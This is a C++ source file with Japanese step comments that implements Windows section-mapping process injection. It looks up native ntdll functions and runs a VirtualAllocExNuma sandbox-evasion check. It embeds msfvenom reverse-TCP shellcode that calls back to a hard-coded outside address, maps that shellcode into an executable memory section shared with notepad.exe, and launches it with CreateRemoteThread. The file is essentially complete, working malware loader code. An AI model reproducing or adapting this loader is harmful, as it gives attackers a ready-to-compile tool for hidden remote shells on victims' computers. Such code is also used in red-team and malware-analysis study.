#include <Windows.h>
#include <TlHelp32.h>
#include <winternl.h>
#include <stdio.h>
#include <string>

//NtMapViewOfSectionのInheritDisposition引数の定義
typedef enum _SECTION_INHERIT {
	ViewShare = 1,
	ViewUnmap = 2
} SECTION_INHERIT;

//NtCreateSectionの関数ポインタ型定義
typedef NTSTATUS(NTAPI* pNtCreateSection)(
	OUT PHANDLE SectionHandle,
	IN ULONG DesiredAccess,
	IN POBJECT_ATTRIBUTES ObjectAttributes OPTIONAL,
	IN PLARGE_INTEGER MaximumSize OPTIONAL,
	IN ULONG SectionPageProtection,
	IN ULONG AllocationAttributes,
	IN HANDLE FileHandle OPTIONAL
);

//NtMapViewOfSectionの関数ポインタ型定義
typedef NTSTATUS(NTAPI* pNtMapViewOfSection)(
	IN HANDLE SectionHandle,
	IN HANDLE ProcessHandle,
	IN OUT PVOID* BaseAddress,
	IN ULONG_PTR ZeroBits,
	IN SIZE_T CommitSize,
	IN OUT PLARGE_INTEGER SectionOffset OPTIONAL,
	IN OUT PSIZE_T ViewSize,
	IN SECTION_INHERIT InheritDisposition,
	IN ULONG AllocationType,
	IN ULONG Win32Protect
);

//NtUnmapViewOfSectionの関数ポインタ型定義
typedef NTSTATUS(NTAPI* pNtUnmapViewOfSection)(
	IN HANDLE ProcessHandle,
	IN PVOID BaseAddress
);

//プロセス名からプロセスIDを取得
DWORD FindProcessIdByName(const std::wstring& processName) {
	HANDLE hToolhelp32Snapshot = nullptr;
	hToolhelp32Snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);

	if (hToolhelp32Snapshot == INVALID_HANDLE_VALUE) {
		printf("[+] CreateToolhelp32Snapshot failed with error: %lu\n", GetLastError());
		return EXIT_FAILURE;
	}

	PROCESSENTRY32 pe32;
	pe32.dwSize = sizeof(PROCESSENTRY32);

	if (Process32First(hToolhelp32Snapshot, &pe32)) {
		do {
			if (!processName.compare(pe32.szExeFile)) {
				CloseHandle(hToolhelp32Snapshot);
				return pe32.th32ProcessID;
			}
		} while (Process32Next(hToolhelp32Snapshot, &pe32));
	}

	CloseHandle(hToolhelp32Snapshot);
	return 0;
}

int main(void) {

	//ntdll.dllから必要な関数ポインタを取得するためのハンドルを取得
	HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
	if (hNtdll == NULL) {
		printf("[-] ntdll.dll not found. Error: %lu\n", GetLastError());
		return EXIT_FAILURE;
	}
	//ntdll.dllから必要な関数ポインタの取得
	const auto NtCreateSection = (pNtCreateSection)GetProcAddress(hNtdll, "NtCreateSection");
	const auto NtMapViewOfSection = (pNtMapViewOfSection)GetProcAddress(hNtdll, "NtMapViewOfSection");
	const auto NtUnmapViewOfSection = (pNtUnmapViewOfSection)GetProcAddress(hNtdll, "NtUnmapViewOfSection");

	if(NtCreateSection == NULL || NtMapViewOfSection == NULL || NtUnmapViewOfSection == NULL) {
		printf("[+] GetProcAddress failed with error: %lu\n", GetLastError());
		return EXIT_FAILURE;
	}

	//サンドボックス回避
	HANDLE hCurrentProcess = GetCurrentProcess();
	LPVOID mem = VirtualAllocExNuma(hCurrentProcess, NULL, 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE, 0);
	if (mem == NULL) {
		printf("[-] VirtualAllocExNuma failed with error: %lu\n", GetLastError());
		return EXIT_FAILURE;
	}

	//msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f c -v shellcode
	unsigned char shellcode[] =
		"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
		"\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
		"\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
		"\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
		"\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
		"\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
		"\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"
		"\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"
		"\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"
		"\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"
		"\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"
		"\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
		"\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
		"\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"
		"\x12\xe9\x57\xff\xff\xff\x5d\x49\xbe\x77\x73\x32\x5f\x33"
		"\x32\x00\x00\x41\x56\x49\x89\xe6\x48\x81\xec\xa0\x01\x00"
		"\x00\x49\x89\xe5\x49\xbc\x02\x00\x11\x5c\xc0\xa8\xce\xa5"
		"\x41\x54\x49\x89\xe4\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07"
		"\xff\xd5\x4c\x89\xea\x68\x01\x01\x00\x00\x59\x41\xba\x29"
		"\x80\x6b\x00\xff\xd5\x50\x50\x4d\x31\xc9\x4d\x31\xc0\x48"
		"\xff\xc0\x48\x89\xc2\x48\xff\xc0\x48\x89\xc1\x41\xba\xea"
		"\x0f\xdf\xe0\xff\xd5\x48\x89\xc7\x6a\x10\x41\x58\x4c\x89"
		"\xe2\x48\x89\xf9\x41\xba\x99\xa5\x74\x61\xff\xd5\x48\x81"
		"\xc4\x40\x02\x00\x00\x49\xb8\x63\x6d\x64\x00\x00\x00\x00"
		"\x00\x41\x50\x41\x50\x48\x89\xe2\x57\x57\x57\x4d\x31\xc0"
		"\x6a\x0d\x59\x41\x50\xe2\xfc\x66\xc7\x44\x24\x54\x01\x01"
		"\x48\x8d\x44\x24\x18\xc6\x00\x68\x48\x89\xe6\x56\x50\x41"
		"\x50\x41\x50\x41\x50\x49\xff\xc0\x41\x50\x49\xff\xc8\x4d"
		"\x89\xc1\x4c\x89\xc1\x41\xba\x79\xcc\x3f\x86\xff\xd5\x48"
		"\x31\xd2\x48\xff\xca\x8b\x0e\x41\xba\x08\x87\x1d\x60\xff"
		"\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff\xd5"
		"\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb"
		"\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5";

	SIZE_T len = sizeof(shellcode);

	//ターゲットプロセスのPIDを取得
	std::wstring targetProcessName = L"notepad.exe";
	DWORD targetProcessId = FindProcessIdByName(targetProcessName);
	if(targetProcessId == 0) {
		printf("[-] Process %ls not found.\n", targetProcessName.c_str());
		return EXIT_FAILURE;
	}

	//ターゲットプロセスのハンドルを取得
	HANDLE pHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetProcessId);
	if(pHandle == NULL) {
		printf("[-] OpenProcess failed with error: %lu\n", GetLastError());
		return EXIT_FAILURE;
	}

	printf("[+] Target process handle %p on PID %lu\n", pHandle, targetProcessId);

	//NtCreateSectionを使用して、ペイロードのサイズのRWXメモリセクションを作成
	HANDLE sHandle = NULL;
	LARGE_INTEGER sectionSize = { (DWORD)len };
	NTSTATUS status = NtCreateSection(&sHandle, SECTION_ALL_ACCESS, NULL, &sectionSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);
	printf("[+] Create new shared memory section with handle %p. Success: %s\n", sHandle, (NT_SUCCESS(status) ? "true" : "false"));
	if(!NT_SUCCESS(status)) {
		CloseHandle(pHandle);
		return EXIT_FAILURE;
	}

	//NtMapViewOfSectionを使用して、作成されたセクション(sHandle)のビューをローカルプロセスにマップ
	PVOID baseAddrL = NULL;
	SIZE_T viewSizeL = len;
	status = NtMapViewOfSection(sHandle, hCurrentProcess, &baseAddrL, 0, 0, NULL, &viewSizeL, ViewUnmap, 0, PAGE_READWRITE);
	printf("[+] Mapped local memory section with base address %p.Success: %s\n", baseAddrL, (NT_SUCCESS(status) ? "true" : "false"));
	if(!NT_SUCCESS(status)) {
		CloseHandle(sHandle);
		CloseHandle(pHandle);
		return EXIT_FAILURE;
	}

	//NtMapViewOfSectionを使用して、指定されたリモートプロセス(pHandle)の同じセクションのビューをマップ
	PVOID baseAddrR = NULL;
	SIZE_T viewSizeR = len;
	status = NtMapViewOfSection(sHandle, pHandle, &baseAddrR, 0, 0, NULL, &viewSizeR, ViewUnmap, 0, PAGE_EXECUTE_READWRITE);
	if(!NT_SUCCESS(status)) {
		NtUnmapViewOfSection(hCurrentProcess, baseAddrL);
		CloseHandle(sHandle);
		CloseHandle(pHandle);
		return EXIT_FAILURE;
	}

	//シェルコードをローカルにマップされたビューにコピー。これはリモートマッピングに反映される
	memcpy(baseAddrL, shellcode, len);
	printf("[+] Copied shellcode to locally mapped memory at address %p\n", baseAddrL);

	//CreateRemoteThreadを使用してリモートでマップされたメモリを実行
	HANDLE hThread = CreateRemoteThread(pHandle, NULL, 0, (LPTHREAD_START_ROUTINE)baseAddrR, NULL, 0, NULL);
	if (hThread == NULL) {
		printf("[-] CreateRemoteThread failed with error: %lu\n", GetLastError());
	}
	else {
		printf("[+] Successfully created remote thread in target process with handle %p\n", hThread);
		printf("[*] Injection done\n");
		CloseHandle(hThread);
	}

	//NtUnMapViewOfSectionを使用して、ローカルにマップされたセクション ビューをマップ解除
	status = NtUnmapViewOfSection(hCurrentProcess, baseAddrL);
	printf("Unmapped local memory section at address %p. Success: %s\n", baseAddrL, (NT_SUCCESS(status) ? "true" : "false"));

	CloseHandle(sHandle);
	CloseHandle(pHandle);

	return EXIT_SUCCESS;
}